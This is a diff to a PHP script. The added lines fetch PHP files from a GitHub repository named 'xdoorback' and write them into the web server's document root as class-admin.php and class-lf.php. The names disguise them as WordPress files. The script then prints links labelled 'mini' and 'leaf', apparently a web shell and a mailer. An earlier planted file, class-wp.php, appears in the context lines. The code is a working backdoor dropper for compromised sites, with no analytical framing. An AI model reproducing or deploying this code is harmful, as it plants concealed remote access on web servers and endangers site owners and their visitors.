@@ -50,7 +50,30 @@ if(file_exists($check4)){
 }
 echo " Stored he : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-wp.php\">".$_SERVER['HTTP_HOST']."/class-wp.php  </a>\n<br>";
 
+
+
+$check5 = $_SERVER['DOCUMENT_ROOT'] . "/class-admin.php" ;
+$text5 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/xx.php');
+$open5 = fopen($check5, 'w');
+fwrite($open5, $text5);
+fclose($open5);
+if(file_exists($check5)){
+}
+echo " Stored mini : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-admin.php\">".$_SERVER['HTTP_HOST']."/class-admin.php  </a>\n<br>";
+
+
+
+$check6 = $_SERVER['DOCUMENT_ROOT'] . "/class-lf.php" ;
+$text6 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/lf.php');
+$open6 = fopen($check6, 'w');
+fwrite($open6, $text6);
+fclose($open6);
+if(file_exists($check6)){
+}
+echo " Stored leaf : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-lf.php\">".$_SERVER['HTTP_HOST']."/class-lf.php  </a>\n<br>";
+
 ?>
+
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1256" /></head><body>
 <?php
